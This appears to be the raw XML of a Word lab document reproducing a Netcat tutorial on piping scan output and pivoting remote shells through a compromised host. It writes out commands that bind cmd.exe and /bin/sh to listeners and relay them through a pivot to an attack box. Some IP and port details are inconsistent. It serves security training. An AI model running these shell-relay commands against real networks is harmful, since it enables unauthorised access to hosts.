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0F20A" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="0" w:right="0"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Lab – Performing a Netcat Pivoting Attack</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:p w14:paraId="2A9257A1"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In part 3 of the Hacking with Netcat tutorial series we will be looking at some more advanced techniques. As we know by now Netcat is also called the Swiss army knife of networking tools. Swiss army networking tools should be able to do a lot more than making raw data connections and shells. Therefore, we have to look at some advanced features too. In this tutorial we will learn how to pipe Netcat output to files and applications and how network pivoting with Netcat works. In this tutorial we will be looking at a couple different scenario’s where we will be using Netcat to pivot connections. Pivoting network connections is useful when a target host is on a network that is not directly accessible from the attack box’s network. In this situation we can compromise a host that has access to both networks and pivot connections through this host. The compromised host with access to both networks is called the pivot point. Let’s start with piping Netcat’s output to files and applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3887D7" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="0" w:right="0"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Piping Netcat output to files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C02077"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First, we will be piping the output from a simple netcat port scan to a file named output.txt. In general command line output can be outputted to a file by using the &gt; operator followed by a file name. For Netcat this won’t work because we need to direct both stderr and stdout into the file. We can do this by using the following command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAA5B82" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="720" w:right="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nc -vv -z localhost 1-100 &gt; output.txt 2&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358561BE" w14:textId="69B709D3" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>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4632A614" wp14:editId="7C47CE01">
            <wp:extent cx="4972050" cy="3648075"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="8" name="Picture 8" descr="1 - Netcat write output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 Netcat write output to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648075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="590395DB"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Output Netcat port scan to file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7998D89C"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This command outputted all result from the port scan to the output.txt file. We can use the following command to filter the output for open ports using grep:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BAC1A5" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="720" w:right="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nc -vv -z localhost 1-100 2&gt;&amp;1 | grep open &gt; output.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A3C336" w14:textId="619994A4" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:ind w:left="0" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="201A3A97" wp14:editId="529963E1">
            <wp:extent cx="5124450" cy="419100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7" name="Picture 7" descr="2 - Netcat grep output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 Netcat grep output to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419100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F84DA96"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Grep netcat output to file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C2A2E1"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This command only outputs the open ports to the text file. Let’s see how we can pipe netcat input and output to pivot network connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EF6B48" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="0" w:right="0"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Windows network pivoting with Netcat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F35EF5"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Let’s assume we have 2 Windows targets and 1 Kali Linux attack box. We have compromised Windows host 1 from the Kali Linux machine and we want to gain a shell on Windows host 2 which is only accessible from Windows host 1. We would need to direct the traffic from the Kali </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Linux host to Windows host 1 and then redirect it to Windows host 2. The output should be send back to Windows host 1 where it will be redirected back to the Kali Linux machine. Confusing? Let’s have a look at the following graphic for a better understanding:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8EA084" w14:textId="0E25D9AD"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noProof/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="294666DB" wp14:editId="1C7D4DFE">
            <wp:extent cx="2447925" cy="2600325"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="6" name="Picture 6" descr="3 - Netcat Windows pi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 Netcat Windows pivo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600325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B0B4AF"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In a virtual lab we have configured this scenario with 2 Windows machines and 1 Kali Linux machine. On the pivot point we will be piping the input commands from the attack box to the target host. The output from the target host will be piped back to the attack box from the pivot point. Let’s have at which Netcat commands we have to use for every machine. We will be using port 3333 and port4444 for the connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D10510D" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 1 needs to direct incoming traffic on port 3333 to Windows host 2 on port 4444 and input traffic from Windows host 2 must be send to Kali Linux output on port 2222.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66023164" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 2 needs to attach incoming commands on port 4444 to CMD.exe and redirect the output back to Windows host 1 on port 4444.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2DC914" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Linux should be sending commands to Windows host 1 on port 3333 and receive input from Windows host 1 on port 4444.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6087F8DA"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Given this information we need to issue the following commands on each machine in this order:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B62B54F" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Linux console Input: nc -lvp 3333</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D28A09" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Linux console Ouput: nc -lvp 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C068284" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 2: nc -lvp 4444 -e cmd.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C9D68C" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 1: nc.exe 10.11.1.16 3333 | nc.exe 10.11.1.198 4444 | nc.exe 10.11.1.16 2222</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A389578"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lastRenderedPageBreak/>
        <w:t>The following graphic describes the connections between the Kali Linux attack machine, the windows host 1 pivot point and the target host; windows host 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CB09E9" w14:textId="56575F49" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:ind w:left="0" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:noProof/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CE4BBA6" wp14:editId="6FE8F04B">
            <wp:extent cx="6219825" cy="1733550"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="4" name="Picture 4" descr="4 - Windows netcat network pivo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 Windows netcat network pivoting ex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9825" cy="1733550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4348305F"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Redirecting traffic with Netcat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437488C0"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The commands issued on the input terminal on the Kali Linux attack box are executed via the pivot point on Windows host 2. The output from Windows host 2 is redirected back to the output terminal on the attack box. The only problem with this setup is that there is a delay on the executed commands and the output. After issuing a command you have to press enter once or twice to see the output appearing in the output terminal on the attack host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AEF83A"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There is also an easier alternative when the -e switch on netcat is available on the pivot point. This alternative only uses 1 terminal session on the attack host. Let’s have a look at how this works by looking at the following commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B75B80B" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Linux attack box: nc -lvp 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2231DA" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 2: nc -lvp 4444 -e cmd.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DF1FFB" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows host 1 – pivot point: nc -v 10.11.1.16 4444 -c ”nc -v 10.11.1.198 4444”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADACB55"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The first commands sets up listener on the attack box and the second command on the target host. The last command opens a Netcat session with the attack box and uses a new Netcat session to the target host as inbound program. Note that the pivot point and target host both use the -e switch on Netcat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B74BFA" w14:textId="0E5D50A7" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>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3DFF8BD9" wp14:editId="4346CE18">
            <wp:extent cx="5791200" cy="4800600"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3" name="Picture 3" descr="5 - Windows netcat network pivotin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 Windows netcat network pivoting exampl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4800600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EA9654"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Network pivoting with Netcat on Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5295EC8E"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As you can see on the first terminal we have shell on the target host through the pivot point. This construction also has a delay so you have to press enter once or twice receive output from the target host. If you know how to fix this, please leave a comment below!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA0EDD5"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Let’s see if we can do the same thing on 3 Linux hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D0F3F3" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="0" w:right="0"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Linux network pivoting with Netcat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2B7682"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In the following scenario we have 3 Linux hosts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416E5323" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.11.1.16 is the attack box running on Kali Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40782D92" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.11.1.250 is the pivot point.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D791B4B" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>10.11.1.95 is the target host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A19039C"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The following graphic illustrates the scenario with the attack box, pivot point and target host:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAC38B5" w14:textId="6D524AB3"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noProof/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0FA4D4AF" wp14:editId="3257CCA3">
            <wp:extent cx="2447925" cy="2600325"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="2" name="Picture 2" descr="Linux netcat network pivoting scenar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netcat network pivoting scenari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2600325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76086B11"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We will be using the following commands on the different hosts in the following order:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0059FF" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.11.1.16 attack box: nc -lvp 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="748957FC" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.11.1.96 target host: nc -lvp 4444 -e /bin/sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54016245" w14:textId="77777777" w:rsidR="000B640F" w:rsidRDefault="000B640F" w:rsidP="000B640F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:ind w:left="1440" w:right="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.11.1.250 pivot point: nc -v 10.11.1.16 4444 -e ”nc -v 10.11.1.96 4444”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5423D77E"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The first command sets up a listener on port 4444 on the Kali Linux attack box. The second command sets up a listener on the target host, also on port 4444. The last command is executed on the pivot machine and connects to both the attack box and the target host on port 4444.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0EE239"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The following screenshot displays the different terminals from the 3 machines. The first terminal is the attack box, the second terminal is the pivot point and the last one is the target host:</w:t>
      </w:r>
    </w:p>
